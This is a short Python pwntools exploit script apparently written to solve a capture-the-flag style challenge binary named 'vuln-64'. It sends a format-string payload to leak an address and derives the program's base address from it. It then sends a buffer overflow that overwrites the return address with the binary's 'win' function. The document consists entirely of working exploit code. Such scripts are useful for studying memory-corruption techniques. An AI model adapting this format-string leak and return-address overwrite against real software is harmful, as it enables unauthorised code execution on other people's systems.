from pwn import *

exe='./vuln-64'

elf=context.binary=ELF(exe)

p=elf.process()

offset_rip=40

payload=b'%4$lp' #the 4 value seems to be an address, after a quick search it is an address in heap
p.recvline()
p.sendline(payload)
p.recvuntil(b'you')

ret_address=int(p.recvline(),16)

elf.address=ret_address-0x56b6

info(hex(elf.address))


payload=flat({
    offset_rip:elf.sym['win']
})

p.sendline(payload)

log.success(p.clean())